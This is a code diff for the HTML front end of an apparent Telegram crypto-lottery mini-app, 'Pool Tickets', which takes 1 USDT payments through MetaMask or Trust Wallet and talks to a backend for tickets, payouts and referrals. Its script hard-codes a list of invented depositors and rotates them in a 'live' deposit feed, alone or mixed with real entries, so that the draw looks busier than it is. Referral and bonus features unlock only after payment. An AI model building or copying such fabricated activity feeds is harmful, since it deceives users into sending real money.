@@ -469,6 +469,7 @@
         </div>
 
         <button class="btn btn-cyber" style="padding: 12px; font-size: 12px;" onclick="connectAndPayWeb3()">🚀 Payer 1 USDT en 1 Clic (MetaMask)</button>
+        <button class="btn btn-outline" style="padding: 10px; font-size: 11px;" onclick="payWithTrustWallet()">🛡️ Payer avec Trust Wallet (BEP20)</button>
         <div id="web3Status" style="font-size: 10.5px; color: var(--gold); font-family: 'JetBrains Mono', monospace; text-align: center;"></div>
 
         <div style="border-top: 1px solid rgba(255,255,255,0.08); margin: 4px 0;"></div>
@@ -531,3 +532,324 @@
     <div class="footer">
         POOL TICKETS • PROTECTED BLOCKCHAIN PROTOCOL • REAL USDT JACKPOT
     </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        const API_BASE = "https://pool-tickets-backend.onrender.com";
+        const BOT_USERNAME = "PoolTickets_bot";
+        const RECEIVE_WALLET = "0x93872BdE7652373c87Afd53b6659054cCAb060D2";
+        const USDT_BEP20_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+        const CHANNEL_LINK = "https://t.me/+NFyi_gZV3zM5ODZk";
+
+        const user = tg.initDataUnsafe?.user || { id: 100001, username: "cyber_vip" };
+        const username = user.username ? `@${user.username}` : `Player_${String(user.id).slice(-4)}`;
+        const memoString = `PT-${user.id}`;
+        const refLink = `https://t.me/${BOT_USERNAME}?start=ref_${user.id}`;
+
+        document.getElementById('username').innerText = username;
+        document.getElementById('memoCode').innerText = memoString;
+
+        let hasPaidTicket = false;
+        let channelStepJoined = false;
+        let countdownEndTimestamp = 0;
+
+        const seededDepositors = [
+            `@<span class="masked-txt">net_runner</span> deposited 1 USDT`,
+            `@<span class="masked-txt">node_04</span> deposited 3 USDT`,
+            `@<span class="masked-txt">cyber_ghost</span> deposited 2 USDT`,
+            `@<span class="masked-txt">bep_whale</span> deposited 7 USDT`,
+            `@<span class="masked-txt">hex_trader</span> deposited 4 USDT`,
+            `@<span class="masked-txt">sys_admin</span> deposited 5 USDT`,
+            `@<span class="masked-txt">z_ion</span> deposited 2 USDT`,
+            `@<span class="masked-txt">neo_trx</span> deposited 7 USDT`
+        ];
+        let depositFeedList = [...seededDepositors];
+        let depositIdx = 0;
+
+        new QRCode(document.getElementById("qrcode"), {
+            text: refLink,
+            width: 120,
+            height: 120
+        });
+
+        function copyText(txt, msg) {
+            navigator.clipboard.writeText(txt);
+            tg.showAlert(msg);
+        }
+
+        function copyWallet() {
+            copyText(RECEIVE_WALLET, "BEP20 Address copied! Transfer USDT on BNB Smart Chain.");
+        }
+
+        function copyMemo() {
+            copyText(memoString, "Reference Memo copied!");
+        }
+
+        function copyRefLink() {
+            copyText(refLink, "Referral link copied to clipboard.");
+        }
+
+        function toggleModal(id) {
+            const modal = document.getElementById(id);
+            modal.style.display = modal.style.display === 'flex' ? 'none' : 'flex';
+        }
+
+        function toggleReferral() {
+            if (!hasPaidTicket) {
+                tg.showAlert("🔒 PROTOCOL LOCKED: Mint at least 1 ticket to unlock your referral link.");
+                return;
+            }
+            toggleModal('referralModal');
+        }
+
+        function openExternalWallet(url) {
+            if (tg && typeof tg.openLink === 'function') {
+                tg.openLink(url, { try_instant_view: false });
+            } else {
+                window.open(url, '_blank');
+            }
+        }
+
+        function payWithTrustWallet() {
+            const statusDiv = document.getElementById('web3Status');
+            statusDiv.innerHTML = "⏳ Redirection vers Trust Wallet...";
+            const trustUrl = `https://link.trustwallet.com/send?coin=20000714&address=${RECEIVE_WALLET}&amount=1&token_id=${USDT_BEP20_CONTRACT}`;
+            openExternalWallet(trustUrl);
+        }
+
+        async function connectAndPayWeb3() {
+            const statusDiv = document.getElementById('web3Status');
+
+            if (typeof window.ethereum === 'undefined') {
+                statusDiv.innerHTML = "⏳ Ouverture de MetaMask (1 USDT BEP20)...";
+                const eip681Url = `https://metamask.app.link/send/${USDT_BEP20_CONTRACT}@56/transfer?address=${RECEIVE_WALLET}&uint256=1000000000000000000`;
+                openExternalWallet(eip681Url);
+                return;
+            }
+
+            try {
+                statusDiv.innerHTML = "⏳ Connexion...";
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+
+                const network = await provider.getNetwork();
+                if (network.chainId !== 56) {
+                    statusDiv.innerHTML = "⚠️ Basculement sur la BSC...";
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }],
+                    });
+                }
+
+                const signer = provider.getSigner();
+                statusDiv.innerHTML = "⏳ Transfert de 1 USDT...";
+
+                const USDT_ABI = ["function transfer(address to, uint amount) public returns (bool)"];
+                const usdtContract = new ethers.Contract(USDT_BEP20_CONTRACT, USDT_ABI, signer);
+                const tx = await usdtContract.transfer(RECEIVE_WALLET, ethers.utils.parseUnits("1.0", 18));
+                
+                statusDiv.innerHTML = `⏳ Validation blockchain...`;
+                const receipt = await tx.wait();
+
+                const res = await fetch(`${API_BASE}/api/verify-tx`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ user_id: user.id, tx_hash: receipt.transactionHash })
+                });
+
+                const data = await res.json();
+                if (data.ok) {
+                    statusDiv.innerHTML = `🎉 Succès ! ${data.tickets_issued} ticket(s) minté(s) !`;
+                    loadState();
+                    toggleModal('buyModal');
+                } else {
+                    statusDiv.innerHTML = `⚠️ Erreur : ${data.error}`;
+                }
+            } catch (err) {
+                console.error(err);
+                statusDiv.innerHTML = `❌ Opération annulée.`;
+            }
+        }
+
+        async function savePayoutWallet() {
+            const addr = document.getElementById('payoutWalletInput').value.trim();
+            if (!addr.startsWith("0x") || addr.length !== 42) {
+                tg.showAlert("Invalid BEP20 address. Must be 42 characters starting with 0x.");
+                return;
+            }
+            try {
+                const res = await fetch(`${API_BASE}/api/save-wallet`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ user_id: user.id, address: addr })
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    tg.showAlert("✅ Payout wallet securely registered!");
+                } else {
+                    tg.showAlert(data.error || "Error saving wallet.");
+                }
+            } catch (e) {
+                tg.showAlert("Network error connecting to backend protocol.");
+            }
+        }
+
+        async function submitTxHash() {
+            const txHash = document.getElementById('txHashInput').value.trim();
+            if (!txHash.startsWith("0x") || txHash.length !== 66) {
+                tg.showAlert("Invalid TXID hash. Must be 66 characters starting with 0x.");
+                return;
+            }
+            try {
+                const res = await fetch(`${API_BASE}/api/verify-tx`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ user_id: user.id, tx_hash: txHash })
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    document.getElementById('txHashInput').value = "";
+                    tg.showAlert(`⚡ Verified On-Chain! ${data.tickets_issued} real ticket(s) minted!`);
+                    loadState();
+                } else {
+                    tg.showAlert(data.error || "Transaction verification failed.");
+                }
+            } catch (e) {
+                tg.showAlert("Connection error during blockchain verification.");
+            }
+        }
+
+        async function handleChannelAction() {
+            if (!hasPaidTicket) {
+                tg.showAlert("🔒 Locked: Mint 1 ticket first to unlock VIP bonuses.");
+                return;
+            }
+            if (!channelStepJoined) {
+                tg.openTelegramLink(CHANNEL_LINK);
+                channelStepJoined = true;
+                document.getElementById('channelBtn').innerText = "✅ Click Again to Claim Ticket";
+                return;
+            }
+            try {
+                const res = await fetch(`${API_BASE}/api/claim-channel`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ user_id: user.id })
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    tg.showAlert(`🎉 VIP Bonus Minted! Ticket ${data.ticket_code} added!`);
+                    loadState();
+                } else {
+                    tg.showAlert(data.error || "Please ensure you have joined the VIP network.");
+                }
+            } catch (e) {
+                tg.showAlert("Protocol connection error.");
+            }
+        }
+
+        function updateTimerDisplay() {
+            if (countdownEndTimestamp > 0) {
+                const nowSec = Math.floor(Date.now() / 1000);
+                const diff = Math.max(0, countdownEndTimestamp - nowSec);
+                const d = Math.floor(diff / 86400);
+                const h = Math.floor((diff % 86400) / 3600);
+                const m = Math.floor((diff % 3600) / 60);
+                const s = diff % 60;
+                document.getElementById('drawStatus').innerText = `⏳ FINAL COUNTDOWN: ${d}d ${h}h ${m}m ${s}s`;
+            }
+        }
+        setInterval(updateTimerDisplay, 1000);
+
+        setInterval(() => {
+            if (depositFeedList.length > 0) {
+                depositIdx = (depositIdx + 1) % depositFeedList.length;
+                const feedEl = document.getElementById('depositFeedText');
+                feedEl.style.opacity = '0';
+                setTimeout(() => {
+                    feedEl.innerHTML = depositFeedList[depositIdx];
+                    feedEl.style.opacity = '1';
+                }, 200);
+            }
+        }, 3500);
+
+        async function loadState() {
+            try {
+                const res = await fetch(`${API_BASE}/api/state?user_id=${user.id}`);
+                const data = await res.json();
+
+                document.getElementById('seasonBadge').innerText = `SEASON #${data.season}`;
+                document.getElementById('prizePool').innerText = `$${data.prize_pool.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+                hasPaidTicket = data.has_paid_ticket;
+                countdownEndTimestamp = data.countdown_end;
+
+                const displayPool = Math.floor(data.prize_pool);
+                const pct = Math.min(100, (data.prize_pool / data.target_goal) * 100).toFixed(1);
+                document.getElementById('milestonePct').innerText = `${pct}% ($${displayPool.toLocaleString()} / $${data.target_goal.toLocaleString()})`;
+                document.getElementById('milestoneBar').style.width = `${pct}%`;
+
+                if (countdownEndTimestamp === 0) {
+                    document.getElementById('drawStatus').innerText = `🎯 Target Goal: $${displayPool.toLocaleString()} / $${data.target_goal.toLocaleString()} USDT`;
+                } else {
+                    updateTimerDisplay();
+                }
+
+                if (data.payout_address && !document.getElementById('payoutWalletInput').value) {
+                    document.getElementById('payoutWalletInput').value = data.payout_address;
+                }
+
+                document.getElementById('shardCounter').innerText = `${data.fragments}/4`;
+
+                if (data.channel_claimed) {
+                    const btn = document.getElementById('channelBtn');
+                    btn.innerText = "✅ VIP Protocol Claimed";
+                    btn.disabled = true;
+                }
+
+                const myCount = data.my_tickets.length;
+                document.getElementById('ticketCount').innerText = myCount;
+                const list = document.getElementById('ticketsList');
+                if (myCount > 0) {
+                    list.innerHTML = data.my_tickets.map(t => `
+                        <div class="ticket-item">
+                            <span>${t.source}</span>
+                            <b style="color: var(--cyan);">${t.code}</b>
+                        </div>
+                    `).join('');
+                }
+
+                if (data.live_feed && data.live_feed.length > 0) {
+                    const realDeposits = data.live_feed
+                        .filter(item => !item.includes("entered Season"))
+                        .map(item => `<span style="color: var(--green); font-weight: 700;">✅ ${item}</span>`);
+                    
+                    if (realDeposits.length > 0) {
+                        depositFeedList = [...realDeposits, ...seededDepositors];
+                    } else {
+                        depositFeedList = [...seededDepositors];
+                    }
+                } else {
+                    depositFeedList = [...seededDepositors];
+                }
+
+                const histDiv = document.getElementById('winnersHistory');
+                if (data.history && data.history.length > 0) {
+                    histDiv.innerHTML = data.history.map(h => `
+                        <div class="ticket-item">
+                            <span>Season #${h.season}: <b>${h.winner}</b><br><small style="color:var(--muted)">${h.ticket}</small></span>
+                            <span style="color: var(--green); font-weight:bold;">$${h.prize.toFixed(2)}</span>
+                        </div>
+                    `).join('');
+                }
+            } catch (e) {
+                console.log("Protocol sync active...");
+            }
+        }
+
+        loadState();
+        setInterval(loadState, 8000);
+    </script>
+</body>
+</html>
